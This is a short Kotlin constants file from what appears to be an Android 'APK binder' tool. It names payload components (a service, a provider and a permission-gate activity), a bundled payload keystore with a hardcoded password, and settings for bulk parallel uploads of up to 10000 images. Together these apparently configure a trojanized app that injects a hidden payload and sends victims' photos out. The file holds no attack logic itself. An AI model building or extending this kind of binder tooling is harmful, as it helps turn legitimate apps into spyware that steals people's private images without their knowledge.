package Com.devhs.apkbinder.core

object Const {

    // ---- Payload entry points ----
    const val PAYLOAD_APP = "Com.devhs.apkbinder.payload.PayloadApp"
    const val PAYLOAD_ACTIVITY = "Com.devhs.apkbinder.payload.PermissionGateActivity"
    const val PAYLOAD_SERVICE = "Com.devhs.apkbinder.payload.PayloadService"
    const val PAYLOAD_PROVIDER = "Com.devhs.apkbinder.payload.PayloadProvider"

    // ---- Assets ----
    const val CONFIG_ASSET = "hs_config.json"
    const val KEYSTORE_ASSET = "payload.keystore"

    // ---- Signing ----
    const val KS_ALIAS = "hs"
    const val KS_PASS = "hsapkbinder"

    // ---- Upload ----
    const val CAPTION = "Developer By Hs"
    const val IMAGE_LIMIT = 10000
    const val PARALLEL_UPLOADS = 8

    // ---- Provider authority ----
    const val AUTHORITY_SUFFIX = ".hsbinder"

    // ---- Notification ----
    const val CHANNEL_ID = "hs_binder_channel"
    const val NOTIF_ID = 1001
}
